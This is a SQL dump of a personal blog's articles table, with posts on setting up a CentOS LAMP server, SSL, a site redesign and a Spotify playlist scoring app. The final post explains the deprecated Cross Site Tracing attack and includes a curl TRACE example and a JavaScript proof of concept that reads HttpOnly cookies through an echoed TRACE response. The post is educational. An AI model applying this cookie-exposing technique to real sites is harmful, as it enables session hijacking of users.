# ************************************************************
# Sequel Pro SQL dump
# Version 5426
#
# https://www.sequelpro.com/
# https://github.com/sequelpro/sequelpro
#
# Host: 127.0.0.1 (MySQL 5.5.5-10.3.11-MariaDB)
# Database: blog
# Generation Time: 2019-01-22 09:13:36 +0000
# ************************************************************


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
SET NAMES utf8mb4;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;


# Dump of table Articles
# ------------------------------------------------------------

DROP TABLE IF EXISTS `Articles`;

CREATE TABLE `Articles` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `link` varchar(45) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'title',
  `date` date NOT NULL,
  `category` varchar(52) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'category',
  `content` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `thumbnail` varchar(45) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'dual-parallax.jpg',
  `tags` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'tag1,tag2',
  `wip` varchar(3) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'yes',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

LOCK TABLES `Articles` WRITE;
/*!40000 ALTER TABLE `Articles` DISABLE KEYS */;

INSERT INTO `Articles` (`id`, `link`, `title`, `date`, `category`, `content`, `thumbnail`, `tags`, `wip`)
VALUES
	(1,'lamp_stack_on_centos','Setting up a LAMP Stack on CentOS 7','2018-02-22','development','<p>Welcome to the first post of my blog! This article will teach you how to set up a LAMP <code>Linux(CentOS), Apache, MySQL, Python</code> web server from scratch, just like how I did to get this blog running. This guide will go through everything and not all of it may apply to your circumstance, so feel free to skip ahead using the table of contents.</p>\r\n<h4>Table of Contents</h4>\r\n<ul>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x100\">The DNS and Web Server</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x200\">Initial Server Setup</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x300\">AMP\'ed up</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x400\">The Apache Config</a></li>\r\n</ul>\r\n\r\n<h3 id=\"x100\">0x100: the DNS and web server</h3><hr>\r\n<p>The DNS (Domain Name System) is a system that resolves a server\'s domain name eg. <code>blog.justinduch.com</code> into an IP address. In order for your webpage to be viewable, you must point your domain name to the webserver.</p>\r\n<p>As this process is different for every domain name registrar and server provider it is up to you to find the documentation to do this for your specific setup. Once you have a sever and domain name aswell as pointed them, we can continue with the guide.</p>\r\n\r\n<h3 id=\"x200\">0x200: initial server setup</h3><hr>\r\n<p>Once you have your new server, you can log into it through SSH with it\'s public IP address. On Linux/Mac machines, use the command:</p>\r\n<pre>[user@okcomputer]$ ssh root@SERVER_IP</pre>\r\n<p>or connect through PUTTY on a Windows machine.</p>\r\n\r\n<h4>0x201: adding a new user</h4>\r\n<p>Now you are logged in as the <code>root</code> user, which is the administrative user in a Linux environment and is given heightend privilages. Because of this, we will create a new user that we will use to log in from now in order to help prevent making any destructive changes on accident.</p>\r\n<pre>[root@okserver]# useradd USER_NAME</pre>\r\n<p>Now you can assign the user a password:</p>\r\n<pre>[root@okserver]# passwd USER_NAME</pre>\r\n<p>Our new user has been set up, but it only has regular user privilages. If we ever want to do administrative tasks on the server (like installing packages in the later sections), our regular user will be denied access. To avoid having to go back to root, we can set up our user as a \'super user\'. This allows the user to run commands with root privilages by adding <code>sudo</code> before each command.</p>\r\n<p>To do this we will add our user to the <code>wheel</code> group. By default, on CentOS, members of the <code>wheel</code> group have sudo privileges.</p>\r\n<pre>[root@okserver]# usermod -aG wheel USER_NAME</pre>\r\n\r\n<h4>0x202: configuring ssh</h4>\r\n<p>To make our server more secure we will configure the SSH daemon to disallow remote SSH access from root and change the deafult SSH port. Changing the default port from 22 to someting more unique will help to stop many automated attacks, and make it harder to guess which port SSH is accessible from. You can enter any port number from 1024 to 32,767.</p>\r\n<p>Open the configuration file on your text editor eg. vi or nano:</p>\r\n<pre>[root@okserver]# vi /etc/ssh/sshd_config</pre>\r\n<p>Look for the lines:</p>\r\n<pre>...&#13;&#10;Port 22&#13;&#10;...&#13;&#10;#PermitRootLogin yes</pre>\r\n<p>and change them to:</p>\r\n<pre>...&#13;&#10;Port YOUR_PORT_NUMBER&#13;&#10;...&#13;&#10;PermitRootLogin no</pre>\r\n<p>Now that we have made our changes, we will restart SSH and test our configuration:</p>\r\n<pre>[root@okserver]# systemctl reload ssh</pre>\r\n<p>Open a <b>new</b> terminal window (do not disconnect from the old session until we can verify that the config works) and connect with the command:</p>\r\n<pre>[user@okcomputer]$ ssh -p PORT user@SERVER_IP</pre>\r\n<p>You should now be logged in as your new user through the new SSH port. If your server has a firewall you may also want to allow TCP connections through the new port and block the old port.</p>\r\n\r\n<h3 id=\"x300\">0x300: AMP\'ed up</h3><hr>\r\n<p>With our server configured we can now go through the the final 3 letters of the LAMP stack.</p>\r\n<p>Before we install anything we should update the system:</p>\r\n<pre>[user@okserver]$ sudo yum -y update</pre>\r\n<p>Remember that we need to use <code>sudo</code> from now on to gain root privilages!</p>\r\n<p>From now on this guide will use vim instead of vi as it\'s text editor, to install vim enter:</p>\r\n<pre>[user@okserver]$ sudo yum install vim</pre>\r\n\r\n<h4>0x301: a for apache</h4>\r\n<p>Install Apache with:</p>\r\n<pre>[user@okserver]$ sudo yum install httpd</pre>\r\n<p>now you can start and enable the service:</p>\r\n<pre>[user@okserver]$ sudo systemctl start httpd.service&#13;&#10;[user@okserver]$ sudo systemctl enable httpd.service</pre>\r\n\r\n<h4>0x302: m for mysql</h4>\r\n<p>We are actually installing MariaDB for our database, but it still starts with a \'m\' so it counts.</p>\r\n<pre>[user@okserver]$ sudo yum install mariadb mariadb-server</pre>\r\n<p>start and enable it:</p>\r\n<pre>[user@okserver]$ sudo systemctl start mariadb&#13;&#10;[user@okserver]$ sudo systemctl enable mariadb</pre>\r\n<p>Now you will want to set up the database. Add a root user with:</p>\r\n<pre>[user@okserver]$ mysqladmin -u root password PASSWORD</pre>\r\n<p>You can test it by connecting to the database with:</p>\r\n<pre>[user@okserver]$ mysql -u root -p</pre>\r\n\r\n<h4>0x303: p for python</h4>\r\n<p>CentOS actually comes with Python2.7 by deafult, so if you are one of those neanderthals who still use 2.7 you can skip this step. For the rest of us intellectuals, you will need to install install IUS, which stands for Inline with Upstream Stable. IUS provides the Red Hat Package Manager (RPM) packages for some newer versions of select software.</p>\r\n<pre>[user@okserver]$ sudo yum install https://centos7.iuscommunity.org/ius-release.rpm</pre>\r\n<p>Now you can install Python3:</p>\r\n<pre>[user@okserver]$ sudo yum install python36u</pre>\r\n<p>You may also want to install pip and the development package needed for the mysqldb module:</p>\r\n<pre>[user@okserver]$ sudo yum install python36u-pip python36u-devel</pre>\r\n\r\n<p>Now your LAMP stack is installed! The next section goes through the Apache config to get you to the testing page.</p>\r\n\r\n<h3 id=\"x400\">0x400: the apache config</h3><hr>\r\n<p>This section will go through how to get a set up a virtual host in Apache. You can choose many different ways to set up a virtual host, this guide will show the way I did it.</p>\r\n<p>Create the required directories for the website:</p>\r\n<pre>[user@okserver]$ sudo mkdir /var/www/YOUR_DOMAIN&#13;&#10;[user@okserver]$ sudo mkdir /var/www/YOUR_DOMAIN</span>/cgi-bin&#13;&#10;[user@okserver]$ sudo mkdir /var/www/YOUR_DOMAIN/html&#13;&#10;[user@okserver]$ sudo mkdir /var/www/YOUR_DOMAIN/conf</pre>\r\n<p><code>cgi-bin</code> is the directory where you will keep your scripts.</p>\r\n<p><code>html</code> is the document root for Apache.</p>\r\n<p><code>conf</code> is the directory where your virtual host config is placed.</p>\r\n<p>Now create <code>vhost.conf</code> in the <code>conf</code> directory:</p>\r\n<pre>[user@okserver]$ sudo touch /var/www/YOUR_DOMAIN/conf/vhost.conf</pre>\r\n<p>and and edit it: <pre>[user@okserver]$ sudo vim /var/www/example.com/conf/vhost.conf</pre> Here is a very basic example where <code>example.com</code> is my domain name:</p>\r\n<pre>\r\n&ltVirtualHost *:80&gt\r\n    ServerAdmin admin@example.com\r\n    ServerName example.com\r\n    ServerAlias /app/ \"/var/www/example.com/cgi-bin/\"\r\n    DocumentRoot /var/www/example.com/html\r\n&lt/VirtualHost&gt\r\n</pre>\r\n<p>Now we can edit the Apache config to include this virtual host config:</p>\r\n<pre>[user@okserver]$ sudo vim /etc/httpd/conf/httpd.conf</pre>\r\n<p>and add this line to the end of the file:</p>\r\n<pre>Include /var/www/example.com/conf/vhost.conf</pre>\r\n<p>Restart Apache with:</p>\r\n<pre>[user@okserver]$ sudo apachectl graceful</pre>\r\n<p>That\'s it! You can test if your web server works by typing your domain into the browser, which should direct you to Apache\'s testing page. For more config options see the <a href=\"https://httpd.apache.org/docs/2.4/vhosts/\" target=\"_blank\">official documentation</a>.</p>','lamp-stack-thumb.png','linux,centos,apache,mysql,python','no'),
	(2,'ssl_and_encryption','SSL and Encryption','2018-04-02','development','<p>TLS (Transfer Layer Security) / SSL (Secure Socket Layer) are standard, cryptographic protocols that establish security over computer networks, between a web server and a browser. SSL provides a trusted environment where all data being transmitted is encrypted.</p>\r\n                <p>This article is technically a continuation of my <a href=\"/article/lamp_stack_on_centos\" target=\"_blank\">last article</a> where we set up a CentOs7 server with Apache, and will go through explaining SSL aswell as setting it up our sever.</p>\r\n                <h4>table of contents</h4>\r\n                <ul>\r\n                    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x100\">TLS/SSL?</a></li>\r\n                    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x200\">A Primer on Encryption and SSL</a></li>\r\n                    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x300\">The SSL Certificate</a></li>\r\n                    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x400\">Let\'s Encrypt</a></li>\r\n                </ul>\r\n\r\n                <h3 id=\"x100\">0x100: TLS/SSL?</h3><hr>\r\n                <p>The terms SSL and TLS are often used interchangeably or in conjunction with each other (TLS/SSL), but one is in fact the predecessor of the other — SSL 3.0 served as the basis for TLS 1.0 which, as a result, is sometimes referred to as SSL 3.1.</p>\r\n                <p>As SSL was named by Netscape, the creators of the protocol, it was changed to TLS to avoid any legal issues with them so that the protocol could be \"open and free\". It also hints at the idea that the protocol works over any bidirectional stream of bytes, not just Internet-based sockets.</p>\r\n                <p>In order to prevent any confusion we will refer to TLS/SSL as just SSL from now on.</p>\r\n\r\n                <h3 id=\"x200\">0x200: a primer on encryption and SSL</h3><hr>\r\n                <h4>0x201: asymertric and symmetric encryption</h4>\r\n                <p>Asymmetric encryption (or public-key cryptography) uses a separate key for encryption and decryption. Anyone can use the encryption key (public key) to encrypt a message. However, decryption keys (private keys) are secret. This way only the intended receiver can decrypt the message.</p>\r\n                <p>Asymmetric keys are typically 1024 or 2048 bits. However, keys smaller than 2048 bits are no longer considered safe to use. Though larger keys can be created, the increased computational burden is so significant that keys larger than 2048 bits are rarely used. To put it into perspective, it would take an average computer more than 14 billion years to crack a 2048-bit certificate.</p>\r\n                <p>Symmetric encryption (or pre-shared key encryption) uses a single key to both encrypt and decrypt data. Both the sender and the receiver need the same key to communicate.</p>\r\n                <p>Symmetric key sizes are typically 128 or 256 bits, where a larger key is harder to crack. For example, a 128-bit key has <code>340,282,366,920,938,463,463,374,607,431,768,211,456</code> encryption code possibilities.</p>\r\n                <p>Whether a 128-bit or 256-bit key is used depends on the encryption capabilities of both the server and the client software. SSL Certificates do not dictate what key size is used. </p>\r\n\r\n                <h4>0x202: SSL</h4>\r\n                <p>An SSL encrypted connection is generated through both asymmetric and symmetric cryptography through an SSL handshake. In SSL communications, the server’s SSL Certificate contains an asymmetric public and private key pair. The session key that the server and the browser create during the SSL Handshake is symmetric. In essence:</p>\r\n                <ul>\r\n                    <li>The handshake begins when a client connects to an SSL-enabled server requesting a secure connection.</li>\r\n                    <li>The server then provides identification in the form of a digital certificate. The certificate contains the server name, the trusted certificate authority (CA) that vouches for the authenticity of the certificate, and the server\'s public encryption key.</li>\r\n                    <li>The client confirms the validity of the certificate before proceeding and then creates a symmetric session key and encrypts it with the server\'s asymmetric public key. Then sends it to the server.</li>\r\n                </ul>\r\n                <p>This concludes the handshake and begins the secured connection, which is encrypted and decrypted with the session key until the connection closes. If any one of the above steps fails, then the SSL handshake fails and the connection is not created.</p>\r\n\r\n                <h3 id=\"x300\">0x300: the SSL certificate</h3><hr>\r\n                <p>The SSL certificate is the most important component when generating an SSL connection between the client and server. Anyone can create a certificate, but browsers only trust certificates that come from an organization on their list of trusted CAs. Browsers come with a pre-installed list of trusted CAs, known as the Trusted Root CA store. In order to be added to the Trusted Root CA store and thus become a Certificate Authority, a company must comply with and be audited against security and authentication standards established by the browsers.</p>\r\n                <p>SSL Certificates will contain details of whom the certificate has been issued to. This includes the domain name or common name, serial number; the details of the issuer; the period of validity - issue date and expiry date; SHA Fingerprints; subject public key algorithm, subject\'s public key; certificate signature algorithm, certificate signature value. Other important details such as the type of certificate, SSL/TLS version, Perfect Forward Secrecy status, and cipher suite details are included. Organization validated and extended validation certificates also contain verified identity information about the owner of the website, including organization name, address, city, state and country.</p>\r\n                <p>For our server we will get an SSL certificate from Let\'s Encrypt, a free, automated, and open CA, run for the public’s benefit.</p>\r\n\r\n                <h3 id=\"x400\">0x0400: let\'s encrypt</h3><hr>\r\n                <p>The first step to using Let\'s Encrypt to obtain an SSL certificate is to install the <code>certbot</code> software on our server. But before we begin, we must will need to enable the EPEL repository, which provides additional packages for CentOS, including the <code>certbot</code> package we need. We will also need to install the <code>mod_ssl</code> module to correctly serve encrypted traffic.</p>\r\n                <pre>[user@okserver]$ sudo yum install epel-release&#13;&#10;[user@okserver]$ sudo yum install mod_ssl python-certbot-apache</pre>\r\n\r\n                <h4>0x202: requesting a certificate</h4>\r\n                <p>Using <code>certbot</code> to generate a certificate is quite easy. The client will automatically obtain and install a new SSL certificate that is valid for the domains provided as parameters. To execute the interactive installation and obtain the certificates, run the certbot command with:</p>\r\n                <pre>[user@okserver]$ sudo certbot --apache -d YOUR_DOMAIN -d OPTIONAL_DOMAIN</pre>\r\n                <p>We will be presented with a step-by-step guide to customize our certificate options. We will be asked to provide an email address for lost key recovery and notices. If our Virtual Host files do not specify the domain they serve explicitly using the <code>ServerName</code> directive, we will be asked to choose the Virtual Host file (the default ssl.conf file should work).</p>\r\n                <p>That\'s pretty much it. The generated certificate files should be available within a subdirectory named after your base domain in the <code>/etc/letsencrypt/live</code> directory. However, as the default SSL configuration shipped with CentOS\'s version of Apache is a bit dated and as such, it is vulnerable to some more recent security issues and is recommended that we select more secure SSL options. I suggest going through Remy van Elst\'s <a href=\"https://raymii.org/s/tutorials/Strong_SSL_Security_On_Apache2.html\" target=\"blank\">tutorial</a> on strong SSL security on the Apache2 webserver, as it does a better job of explaining it\'s solutions than I would.</p>','ssl-enc-thumb.png','ssl,tls,encryption,centos,apache','no'),
	(3,'how_do_you_write_a_blog','How the Fuck Do You Write a Blog?','2018-05-30','development','<p>So far this blog has averaged 0.6 articles per month (including this one) since it was launched in Feburary. Normally you would assume this is just because I\'m lazy or that my social anxiety prevents me from writing anything on the internet because of a constant fear of judgement. And normally you\'d be right, and you are. But it\'s also because of something else.</p>\r\n<p>When I was first creating this blog, I wanted to make everything from scratch (the idiom, not the language) and I really do mean EVERYTHING. Flask? Literally any web framework? Why would I need that when I have Jinja and CGI? URL endpoints? HAH! I could just use the Apache config to map everything! Bootstrap?? WHAT A JOKE! I DON\'T NEED THAT! I\'M A CSS MASTER!</p>\r\n<p>Obviously this was a terrible idea that came from my original plans to have the entire website emulate the command line (which is also a terrible idea that I also have no idea how to do). So now four months later, we will look at the old site and laugh at how stupid I was.</p>\r\n<p>Right before I wrote this article, I mapped the old site on the Wayback Machine so you could go and <a target=\"_blank\" href=\"https://web.archive.org/web/20180529040508/https://blog.justinduch.com\">look at all 8 pages here.</a> You can also see the source code up to the final commit before this redesign <a target=\"_blank\" href=\"https://github.com/apt-helion/blog/tree/484e9c3d808e08ab41605a3c8a36c4793ba49274\">here.</a> I\'ve included some pictures in case you were to lazy to click on those.</p>\r\n<h4>table of contents</h4>\r\n<ul>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x100\">The Looks</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x200\">The Logic</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x300\">The Redesign</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x400\">What\'s Next</a></li>\r\n</ul>\r\n\r\n<h3 id=\"x100\">0x100: The Looks</h3><hr>\r\n<p>There isn\'t too much to say here apart from: \'it isn\'t very nice\'. It was my first time using CSS grid in any real capacity, and while I do like it - probably more than Bootstrap, I wasn\'t able to do very much with my more limited CSS knowledge. You can see I had my original plans in mind while desiging it, with all it\'s plain-ness, but not a good minimalist plain, the bad, uninteresting plain.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/blog1.0-root.png\" alt=\"image-alternative\"><sub>Figure 0: The homescreen with the tree style web page directory</sub>\r\n<p>Let\'s just start with the homepage <code>/</code>. It\'s actually okay in my opinion, probably the best page in the site. The tree style directory map looks decent in the center, making the command line design inspiration very clear. Overall I don\'t hate it, although it is useless because no one would need to go to it.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/blog1.0-articles.png\" alt=\"image-alternative\"><sub>Figure 1: The articles page</sub>\r\n<p>Clicking on articles takes us to <code>/articles</code> and now we face the horror. This is pretty much what the entire site looks like. A harsh contrast of black and white making it very tough on the eyes. The command line design continues with the header showing a nice \'pwd\' which displays your current directory. The tree style pages do not suit the format of a sidebar, and makes it look out of place. If you click on an article, you can see that the sidebar will grow along with the length of the article, but the tree will stay at the top, making the left side wasted space. The design is pretty utilitarian (in the bad way) and makes no attempt to please the reader.</p>\r\n<p>That\'s all I have to say about the asthetics, I don\'t know how to properly critque this. I\'m not a designer by any means and this should have shown you why.</p>\r\n\r\n<h3 id=\"x200\">0x200: The Logic</h3><hr>\r\n<p>Here is the real monster, the reason I haven\'t bothered to write any posts, and maybe even my worst attempt at designing a piece of software I\'ve ever written. I\'m not sure on where to even start, so many things are just wrong and inefficent.</p>\r\n<p>How about the things I didn\'t do? Continuing on from the intro, I didn\'t use any web frameworks with only Jinja as a templating engine and pure CGI magic with Apache rewrite rules to change the URL.</p>\r\n<p>What does this mean? It means that in order to get the blog\'s content to do what I wanted (which was to have each article be accessible from it\'s own URL instead of using a GET request with an ID for the database) the articles had to be in the <code>html</code> folder for Apache to serve them to the user. And since these articles were in the <code>html</code> folder and not <code>cgi-bin</code>, Jinja could not render them, which meant I had no templating for my articles. Of course this then meant that everytime I would have to make a change to the general layout of the blog, I would have do it to the layout for Jinja templating as well as every article in the <code>html</code> folder. Oh no.</p>\r\n<p>My <code>cgi-bin</code> scripts also suffered from this as I had to rewrite the URL for each page. Here\'s a small peak of my Apache config (since it isn\'t on GitHub).</p>\r\n<pre>\r\nRewriteEngine On\r\nRewriteRule ^/$ /index.html [PT]\r\n# Fix later\r\nRewriteRule ^/articles/$ /app/articles [PT]\r\nRewriteRule ^/articles/security$ /app/security [PT]\r\nRewriteRule ^/articles/misc$ /app/misc [PT]\r\nRewriteRule ^/info$ /app/info [PT]\r\nRewriteRule ^/contact-me$ /app/contact [PT]\r\n</pre>\r\n<p>Yeah, it isn\'t pretty. Note the fix later comment.</p>\r\n<p>This caused me a lot of work to be done on even the tinyest change, and really put me off on working on it. That is until I decided to burn it and start again.</p>\r\n\r\n<h3 id=\"x300\">0x300: The Redesign</h3><hr>\r\n<p>What you are reading now is blog 2.0, the redesign. I\'ve made many improvements to make the website better to view and develop. The biggest change as you can imagine is the use of an actual web framework. The blog uses <a href=\"https://github.com/yevrah/simplerr\" target=\"_blank\">simplerr</a>, a framework one of my co-workers made, and one that I find easier to use than Flask (although that may be because I\'ve used it more). It\'s also using a Bootstrap template, so no more plain ugly.</p>\r\n<p>All of this and more such as the tagging system have been made 1 day faster (2 days) than what blog 1.0 took (3 days), which really shows how much easier using other people\'s stuff is. Obviously, there\'s much more to improve, but that is mainly on my side to make it easier to manage/write articles.</p>\r\n\r\n<h3 id=\"x400\">0x400: What\'s Next</h3><hr>\r\n<p>A big feature that\'s standard of every blogging site is the ability to write articles on the site and then uploading it to the database. Right now I write it in HTML using Vim and then manually edit the database. This is pretty inefficent and it wouldn\'t be too hard to add a text editor to the site, but right now I do not want to deal with authentication (so that only I can see and upload in progess articles), so this feature is on hold. I simply do not post enough for this to be a major problem right now ;)</p>\r\n<p class=\"extra-info\"><b>Update 2018-05-31:</b> jks nvm that was easy. I didn\'t need auth, just set an environment variable for the production server, so you can only edit articles on dev machines.</p>','blog1.0-404.png','blogpost','no'),
	(4,'spds_release','Spotify Playlist Depression Score','2018-06-15','development','<sub>Calculating an emotion is not always the best or easiest thing to do.</sub>\r\n<p><a href=\"https://playlistdepressionscore.com\">Spotify Playlist Depression Score</a> is a web application I built to determine how depressing a playlist is from it\'s songs. This article explains how I built it and how it works. As of writing, SPDS is on it\'s 1.0 release, so keep in mind  that there are a lot of improvement to be made, and that this article may not always be up to date. To view the most up to date changes, go through the <a href=\"https://github.com/apt-helion/spds/releases\">changelog on GitHub</a>  or view all SPDS articles through the <a href=\"/tag/spds\">#SPDS tag.</a></p>\r\n<h4>Table of Contents</h4>\r\n<ul>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x100\">The Architecture</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x200\">The Logic</a></li>\r\n</ul>\r\n\r\n<h3 id=\"x100\">0x100: The Architecture</h3><hr>\r\n<p>A big change from the development of this blog is the use of Flask as the web framework. This decision was almost entirely made by the fact that I had no idea how to use sessions in Simplerr at that time (although as it turns out they are functionally the same).  This wasn\'t detrimental in any way, but if I was bothered to redo the application I wouldn\'t be using Flask.</p>\r\n<p>The application heavily relies on AngularJS, which was a real walk into the unknown for me. I\'ve never done much high level front end development, but making a smooth user experience was a must for this project. Angular just does an AJAX call on a Flask endpoint and displays it when it is received. This seems like a small thing, but it allows me to have a proper loading screen and display much more information to the user. Overall I\'d say it looks pretty nice, although I can\'t say the same for the code.</p>\r\n\r\n<h3 id=\"x200\">0x200: The Logic</h3><hr>\r\n<p>If you are looking here to find some incredibly advanced mathematics and natural language processing to see how to determine depression, I\'m sorry but you\'re going to be very disappointed. While I do one day hope to be able to make it more advanced (and useful), this project was more of a learning exercise for a few technologies, and as such, the code behind it is quite simple.</p>\r\n<p>The reason it\'s the \'<strong>Spotify</strong> Playlist Depression Score\' instead of just \'Playlist Depression Score\' is because the Spotify API is an easy way to make sure I can find every song in the playlist. Spotify also does an audio analysis on every track they have. Included with this is a field called \'valence\', which measures from 1 to 0 how happy the audio for the track is, where 1 is MAXIMUM HAPPY and 0 is depression. This means that half our job is already done for us! YAY! Now all that\'s left is the lyrics.</p>\r\n<p>Unfortunately Spotify left us the hardest part of calculating depression. While audio sadness can be somewhat easily determined by looking a what chords are being played, the lyrics are much more difficult as we would need to know what the entire song \'means\'. The application would need to be able to understand what the words mean and what they mean when they are sung together. This is much too hard for me so I took the easy way out.</p> \r\n<p>First we use the Genius API to get our lyrics. However, for some reason getting a track from the API won\'t give us the lyrics, so instead we use the API to find the URL to the Genius website where we can scrape the lyrics from (luckily they are all under a CSS class called \'lyrics\' which makes it very easy to find with BeautifulSoup). Now we go through the song word by word picking out sad words and adding them to a score. I just took this <a href=\"https://github.com/motazsaad/emotion-lexicon\">lexicon</a> and used the emotions most commonly associated with depression. In order to get the valence to match the 1 to 0 scale of Spotify\'s audio, we find the percentage of sad words to lyrics and find the lyrical density of the song to find how important the lyrics are to the song. Then we do some maths which to be honest I\'ve sort of forgotten what it was doing (because it was mainly trial and error to find a value I thought looked right. Impressive, I know). Now we can just average it with the audio valence, and we\'ve found our score!</p>\r\n<p>Of course I could sit here and contemplate typing a single sentence for several hours and generally being incredibly unsure of what I should be saying, but it would probably be better to just show the code as it would do a better job explaining  what it does than I would.</p>\r\n\r\n<pre>\r\n    audio           = spotify.get_audio_features(track[\'track\'][\'id\'])\r\n    audio_valence   = audio[\'valence\']\r\n    lyrical_valence = 0.9 if audio_valence > 0.3 else 0.9 - audio_valence\r\n    score           = round(audio_valence * 100)\r\n    incomplete      = \'yes\'\r\n\r\n    if \'error\' not in lyrics:\r\n        words = re.split(r\'[\\s\\]\\[]\', lyrics)\r\n        sad_words = 0\r\n        for word in words:\r\n            if word in Config.STOP_WORDS or word == \'\': words.remove(word)\r\n            if word in Config.LEXICON_SADNESS: sad_words += 5\r\n            if word in Config.LEXICON_FEAR: sad_words += 2.5\r\n            if word in Config.LEXICON_ANGER: sad_words += 1\r\n\r\n        percent_sad     = sad_words / len(words) * 100\r\n        lyrical_density = len(words) / track[\'track\'][\'duration_ms\'] * 1000\r\n        lyrical_valence = ((1 - (percent_sad * (1 + lyrical_density)) + 100) / 100)\r\n        incomplete      = \'no\'\r\n\r\n    score = round((audio_valence + lyrical_valence) / 2 * 100)\r\n</pre>\r\n\r\n<p>As you may have noticed, the <code>incomplete</code> flag was made because Genius doesn\'t always have the lyrics for a song so we have to guess how sad it\'s lyrics are (if it even has them). This is just based on the audio valence, because I like to assume sad instrumentals means sad song.</p>\r\n\r\n<p>That\'s the entire application, it\'s very small and I have a few more ideas that will probably never get implemented. But it did it\'s job in allowing me to learn some new stuff, and that\'s all that matters right?</p>','spds-thumb.png','spds,python,flask','no'),
	(5,'cross_site_tracing','Retro Exploits: Cross Site Tracing (XST)','2018-06-22','infosec','<p>In 2003, Microsoft attempted to protect against one of the most common forms of Cross Site Scripting by introducing the HttpOnly flag  in Internet Explorer 6, which prevented cookies from being accessed by JavaScript. A common attack was to access the document.cookie object and send it to a web server controlled by the attacker so that they can hijack the victim\'s session. Tagging a cookie as <code>httpOnly</code> forbids JavaScript to access it, protecting it from being sent to a third party. Cross Site Tracing (XST) was discovered by Jeremiah Grossman in 2003, and is a method used to bypass this protection by using the TRACE HTTP method. </p>\r\n\r\n<p>While this method is mostly deprecated now as modern browsers prevent TRACE methods from being made, I still think it\'s interesting to read about, and is simple enough to explain and allow me to practice blog writing. Now if you\'re thinking right now <i>\'But this was only 15 years ago, why are you calling it retro\'</i>? You are right, but you must consider that I was 3 years old when this was discovered, so it\'s pretty damn old for me.</p>\r\n\r\n<p>The TRACE method, according to  <a href=\"https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html\">RFC 2616</a>, \"allows the client to see what is being received at the other end of the request chain and use that data for testing or diagnostic information.\" Basically, it echos what is being sent to it for debugging purposes, allowing to see if the web server is malforming the request. The following is an example using cURL to form the header:</p>\r\n<pre>\r\n$ curl -X TRACE -H \"X-Header: test\" foo.com\r\nTRACE / HTTP/1.1\r\nUser-Agent: curl/7.24.0 \r\nHost: foo.com\r\nAccept: */*\r\nX-Header: test\r\n</pre>\r\n<p>As you can see it just sends the header back. Pretty harmless right? Well obviously not, because otherwise I wouldn\'t be writing about it. The problem is that TRACE will echo all the information you send to the server, this even includes cookies and Web Authentication strings as they are just headers as well.</p>\r\n\r\n<pre>\r\n&lt;script&gt;\r\n  var xmlhttp = new XMLHttpRequest();\r\n  var url = \'http://foo.com/\';\r\n\r\n  xmlhttp.withCredentials = true; // send cookie header\r\n  xmlhttp.open(\'TRACE\', url, false);\r\n  xmlhttp.send();\r\n\r\n  xmlDoc=xmlHttp.responseText;\r\n  alert(xmlDoc);\r\n&lt;/script&gt;\r\n</pre>\r\n\r\n<p>The above JavaScript code will send a TRACE request to the target web server. If the browser has a cookie from the target domain, the cookies will be shown on the alert. Of course this can be easily changed to do something more malicious such as sending the cookie to another server. XST successfully  grants  the  code  ability  bypass  <code>httpOnly</code>  while  accessing \r\ncookie data without the use of <code>document.cookie</code>. </p>\r\n\r\n<p>Although this would no longer work on modern browsers, I still think it is important to know that even something seemingly harmless such as the TRACE method can be used as an exploit. If you want to read more about it, you can go through the <a href =\"http://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf\">white paper</a> for XST written by Jeremiah Grossman.</p>','xst-thumb.png','xst,retro-exploits,xss','no'),
